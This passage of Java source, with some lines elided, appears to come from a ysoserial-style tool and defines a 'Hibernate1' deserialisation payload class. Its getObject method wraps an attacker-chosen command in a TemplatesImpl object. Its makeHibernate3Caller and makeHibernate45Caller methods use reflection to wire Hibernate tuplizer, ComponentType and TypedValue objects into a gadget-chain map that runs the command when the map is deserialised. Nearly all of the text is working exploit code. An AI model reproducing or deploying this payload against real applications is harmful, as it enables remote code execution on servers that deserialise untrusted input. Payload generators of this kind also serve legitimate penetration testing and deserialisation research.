...
public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
    ...
    public static Object makeHibernate4Getter ( Class<?> tplClass, String method ) throws ClassNotFoundException, NoSuchMethodException,
        ...
        dogeser.payloads.util.Reflections.setAccessible(bgCon);
    ...
    public Object getObject ( String command ) throws Exception {
        Object tpl = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
    ...
    static Object makeHibernate45Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        PojoComponentTuplizer tup = dogeser.payloads.util.Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        dogeser.payloads.util.Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t = dogeser.payloads.util.Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        dogeser.payloads.util.Reflections.setFieldValue(t, "componentTuplizer", tup);
        dogeser.payloads.util.Reflections.setFieldValue(t, "propertySpan", 1);
        dogeser.payloads.util.Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        TypedValue v1 = new TypedValue(t, null);
        dogeser.payloads.util.Reflections.setFieldValue(v1, "value", tpl);
        dogeser.payloads.util.Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        dogeser.payloads.util.Reflections.setFieldValue(v2, "value", tpl);
        dogeser.payloads.util.Reflections.setFieldValue(v2, "type", t);

        return dogeser.payloads.util.Gadgets.makeMap(v1, v2);
    }
    ...
    static Object makeHibernate3Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
        ...
        PojoComponentTuplizer tup = dogeser.payloads.util.Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        dogeser.payloads.util.Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
        dogeser.payloads.util.Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);

        ComponentType t = dogeser.payloads.util.Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        HashMap hm = new HashMap();
        hm.put(EntityMode.POJO, tup);
        Object emtm = dogeser.payloads.util.Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]{ Map.class }, new Object[]{ hm });
        dogeser.payloads.util.Reflections.setFieldValue(t, "tuplizerMapping", emtm);
        dogeser.payloads.util.Reflections.setFieldValue(t, "propertySpan", 1);
        dogeser.payloads.util.Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });
